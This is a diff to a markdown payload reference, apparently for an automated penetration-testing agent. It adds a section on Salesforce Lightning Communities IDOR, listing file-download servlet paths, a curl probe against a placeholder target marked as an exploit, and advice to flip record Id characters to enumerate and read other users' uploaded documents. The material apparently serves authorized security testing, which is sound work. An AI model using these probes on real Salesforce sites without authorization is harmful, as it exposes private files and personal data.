@@ -1,3 +1,9 @@
+---
+description: "Salesforce Aura / Lightning Communities deep-enum: POST envelope shape, SObject namespace probe list, tenant-singleton Id prefixes, chain-walk reference fields, IDOR boundedness test"
+skill: vendor-platform-enum
+source: Custom — compiled from the Aura framework, Salesforce platform documentation, and Site Guest profile research.
+---
+
 # Salesforce Aura / Lightning Communities — Deep-Enum Payloads
 
 > Source: Custom — compiled from the Aura framework, Salesforce platform documentation, and Site Guest profile research.
@@ -79,6 +85,23 @@ Take one leaked `recordId` (e.g., the `User` Id from a `LastModifiedById` walk).
 - **Systemic** — adjacent Id returns 200 with a different record. Severity escalates to tenant-wide enumeration.
 
 Record the boundedness verdict in the finding's `details.bounded_or_systemic` field — the verifier and report-writer cannot reconstruct it later.
+
+## File / blob download servlets (ContentVersion IDOR)
+
+A write that returns a `068...` `ContentVersion` id should be followed by a *download* attempt — ownership is frequently unchecked on the download route even when the Aura/REST surface exposes no read. Probe these blob-download endpoints (ties to the object-store IDOR tactic in `agent/references/access-control/idor-modern-architectures.md`):
+
+- `/sfc/servlet.shepherd/version/download/<ContentVersionId>` — download a `ContentVersion` (`068...`) directly.
+- `/servlet/servlet.FileDownload?file=<id>` — legacy `Attachment`/`Document` download by id.
+- `/sfc/servlet.shepherd/document/download/<id>` — download a `ContentDocument` (`069...`).
+
+```bash
+vigil assess kali exec --technique IDOR \
+  --intent "Salesforce ContentVersion blob-download IDOR — read foreign uploaded document" \
+  --probe-kind exploit --phase exploit --timeout 30 -- \
+  curl -sS 'https://TARGET/sfc/servlet.shepherd/version/download/068XXXXXXXXXXXXXXX'
+```
+
+Flip the trailing characters of an observed `068...`/`069...` id to test for systemic enumeration; a 200 with foreign document bytes = cross-user PII read.
 
 ## `executeAction` (worker action) probe
 
